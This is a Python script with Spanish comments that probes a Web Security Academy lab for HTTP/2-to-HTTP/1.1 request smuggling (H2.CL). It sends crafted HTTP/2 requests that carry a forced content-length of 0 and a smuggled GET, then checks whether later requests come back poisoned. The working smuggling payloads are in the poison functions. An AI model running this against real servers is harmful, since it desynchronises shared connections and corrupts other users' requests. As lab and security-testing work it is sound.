#!/usr/bin/env python3
"""
HTTP Request Smuggling  ->  DETECTOR H2.CL  (HTTP/2 downgrade)
=============================================================
El front-end habla HTTP/2 y lo DEGRADA a HTTP/1.1 para el back-end. En H2.CL
el front-end ARRASTRA el header  content-length  que metimos en la peticion
HTTP/2 en lugar de recalcularlo a partir del tamano real de los frames DATA.

Peticion base (equivalente en Burp, lo que pediste):
    POST / HTTP/2
    Host: YOUR-LAB-ID.web-security-academy.net
    Content-Length: 0

    SMUGGLED

Que pasa con  Content-Length: 0 :
  - Front-end NO vulnerable: recalcula el content-length segun los bytes reales
    del frame DATA -> el back-end lee "SMUGGLED" como CUERPO de tu POST /.
    Todo normal, no hay desincronizacion.
  - Front-end vulnerable (H2.CL): reenvia  Content-Length: 0  tal cual. El
    back-end lee 0 bytes de cuerpo, responde a tu POST /, y deja "SMUGGLED"
    en su buffer como INICIO de la SIGUIENTE peticion de esa conexion.

Por que NO basta el timing (a diferencia de detect.py / CL.TE / TE.CL):
  - En H2.CL el back-end SI contesta rapido a tu POST / (cuerpo de 0 bytes).
    Lo colado afecta a la peticion SIGUIENTE, no a la tuya. Por eso medimos un
    DIFERENCIAL: colamos un GET a una ruta canario 404 y miramos si una
    peticion posterior queda contaminada (status raro: 404/400/etc).
  - Igual mandamos una sonda de timing como senal extra (algunos front-ends si
    se quedan esperando y se cuelgan; cuenta como pista, no como prueba).

Requisito:  pip install h2

Uso:
    python h2_cl.py
Cambia HOST abajo por el de tu lab.
"""
import socket
import ssl
import time
import random
import string

try:
    import h2.connection
    import h2.config
    import h2.events
except ImportError:
    raise SystemExit("[!] Falta la libreria 'h2'. Instalala con:  pip install h2")

HOST = "0ab100bd0386b924800703690029000a.web-security-academy.net"   # <-- cambia por tu lab
PORT = 443
TIMEOUT = 8              # segundos por peticion
INTENTOS = 8            # rondas (poison + follow-up); es probabilistico
UMBRAL_HANG = 5.0        # s; si la sonda de timing tarda >= esto -> pista extra


def h2_request(host, port, method, path, extra_headers=None, body=None,
               timeout=TIMEOUT):
    """Manda UNA peticion HTTP/2 (validacion OFF para poder inyectar un
    content-length que no cuadre con el frame DATA) y devuelve
    (status, headers, body_bytes, elapsed_s). status=None si se colgo."""
    ctx = ssl.create_default_context()
    ctx.set_alpn_protocols(["h2"])
    # Labs con certificados raros:
    # ctx.check_hostname = False
    # ctx.verify_mode = ssl.CERT_NONE

    sock = socket.create_connection((host, port), timeout=timeout)
    tls = ctx.wrap_socket(sock, server_hostname=host)
    if tls.selected_alpn_protocol() != "h2":
        tls.close()
        raise SystemExit("[!] El server no negocio HTTP/2 (ALPN != h2).")

    config = h2.config.H2Configuration(
        client_side=True,
        header_encoding="utf-8",        # sin esto ':status' llega como bytes y
                                        # nunca coincide -> status siempre None.
        validate_outbound_headers=False,   # <-- deja pasar content-length raro
        normalize_outbound_headers=False,  #     y NO lo recalcula por nosotros.
        validate_inbound_headers=False,
    )
    conn = h2.connection.H2Connection(config=config)
    conn.initiate_connection()
    tls.sendall(conn.data_to_send())

    headers = [
        (":method", method),
        (":path", path),
        (":authority", host),
        (":scheme", "https"),
    ]
    if extra_headers:
        headers.extend(extra_headers)

    stream_id = conn.get_next_available_stream_id()
    if body is None:
        conn.send_headers(stream_id, headers, end_stream=True)
        tls.sendall(conn.data_to_send())
    else:
        conn.send_headers(stream_id, headers, end_stream=False)
        conn.send_data(stream_id, body.encode("latin-1"), end_stream=True)
        tls.sendall(conn.data_to_send())

    start = time.perf_counter()
    status = None
    resp_headers = []
    resp_body = b""
    try:
        while True:
            try:
                data = tls.recv(65535)
            except socket.timeout:
                break                    # se colgo: cuenta hasta el timeout
            if not data:
                break
            for event in conn.receive_data(data):
                if isinstance(event, h2.events.ResponseReceived):
                    resp_headers = event.headers
                    for name, value in event.headers:
                        if name == ":status":
                            status = value
                elif isinstance(event, h2.events.DataReceived):
                    resp_body += event.data
                    conn.acknowledge_received_data(
                        event.flow_controlled_length, event.stream_id)
                elif isinstance(event, (h2.events.StreamEnded,
                                        h2.events.ConnectionTerminated)):
                    elapsed = time.perf_counter() - start
                    tls.close()
                    return status, resp_headers, resp_body, elapsed
            out = conn.data_to_send()
            if out:
                tls.sendall(out)
    finally:
        try:
            tls.close()
        except Exception:
            pass
    return status, resp_headers, resp_body, time.perf_counter() - start


def rand_path():
    """Ruta canario que casi seguro da 404 en un server normal."""
    s = "".join(random.choices(string.ascii_lowercase + string.digits, k=12))
    return f"/canary-{s}-404"


def poison_completo(canary):
    """Peticion venenosa: content-length 0 + un GET COMPLETO colado a la ruta
    canario. Si es H2.CL, ese GET queda encolado en el back-end y contamina a
    la peticion SIGUIENTE de esa conexion."""
    smuggled = (
        f"GET {canary} HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        "\r\n"
    )
    extra = [("content-length", "0")]        # <-- el vector H2.CL
    return h2_request(HOST, PORT, "POST", "/", extra, smuggled)


def poison_incompleto():
    """Sonda de TIMING: content-length 0 + un GET colado que anuncia mas cuerpo
    del que mandamos. Si el back-end honra el CL:0 y luego parsea esto, se queda
    esperando bytes que no llegan -> se cuelga (pista, no prueba)."""
    smuggled = (
        f"GET {rand_path()} HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        "Content-Length: 50\r\n"
        "\r\n"
        "x=1"                                 # solo 3 bytes; espera 50 -> cuelga
    )
    extra = [("content-length", "0")]
    return h2_request(HOST, PORT, "POST", "/", extra, smuggled)


if __name__ == "__main__":
    print(f"[*] Detector H2.CL  ->  {HOST}:{PORT}")
    print("[*] Vector: POST / HTTP/2 con  content-length: 0  + peticion colada.\n")

    # --- Linea base: como responde un GET / normal (status esperado) ---------
    print("[1] Linea base (GET / normal)...")
    base_status, _, _, base_t = h2_request(HOST, PORT, "GET", "/")
    print(f"    GET /            -> status {base_status}  ({base_t:.2f}s)")

    canary = rand_path()
    print(f"    ruta canario     -> {canary}")
    can_status, _, _, _ = h2_request(HOST, PORT, "GET", canary)
    print(f"    GET {canary} -> status {can_status}  (deberia ser 404)\n")

    # --- Deteccion por diferencial -------------------------------------------
    print(f"[2] Diferencial: {INTENTOS} rondas (poison canario + follow-up GET /)...")
    print("    Buscamos que el follow-up devuelva un status ANOMALO (contaminado).\n")
    detectado = False
    for i in range(1, INTENTOS + 1):
        try:
            p_status, _, _, _ = poison_completo(canary)
            f_status, _, f_body, _ = h2_request(HOST, PORT, "GET", "/")
        except (socket.timeout, ConnectionError, ssl.SSLError) as e:
            print(f"    [{i:02d}] error de red ({e}); reintento...")
            continue

        contaminado = (f_status != base_status)
        marca = ""
        if contaminado:
            marca = f"  <== FOLLOW-UP ANOMALO (base era {base_status})"
            detectado = True
        print(f"    [{i:02d}] poison -> {p_status} | follow-up GET / -> "
              f"{f_status}{marca}")
        if detectado:
            break

    # --- Sonda de timing (pista adicional) -----------------------------------
    print("\n[3] Sonda de timing (GET colado incompleto)...")
    try:
        t_status, _, _, t_t = poison_incompleto()
    except (socket.timeout, ConnectionError, ssl.SSLError):
        t_status, t_t = None, TIMEOUT
    colgado = t_t >= UMBRAL_HANG or t_status is None
    print(f"    poison incompleto -> status {t_status}  ({t_t:.2f}s)"
          f"{'  <== SE COLGO' if colgado else ''}")

    # --- Veredicto -----------------------------------------------------------
    print("\n" + "=" * 55)
    if detectado:
        print(">> PROBABLE H2.CL: una peticion posterior quedo CONTAMINADA por")
        print("   lo colado. El front-end esta arrastrando tu Content-Length: 0.")
        print("   Confirma a mano en Burp (Repeater, 'Send group in sequence').")
    elif colgado:
        print(">> PISTA de H2.CL: la sonda incompleta se colgo (el back-end honro")
        print("   el CL y espera cuerpo). No hubo diferencial claro; reintenta o")
        print("   confirma a mano (a veces hace falta reusar la conexion back-end).")
    else:
        print(">> NO se detecto H2.CL en estas rondas. Puede no ser vulnerable,")
        print("   o el front-end no comparte conexion back-end entre peticiones.")
        print("   Prueba subir INTENTOS o confirmar a mano en Burp.")
    print("=" * 55)
    print("\n[i] Nota: es una prueba PROBABILISTICA (depende del reuso de la")
    print("    conexion front->back). Si sale dudoso, repite el script.")
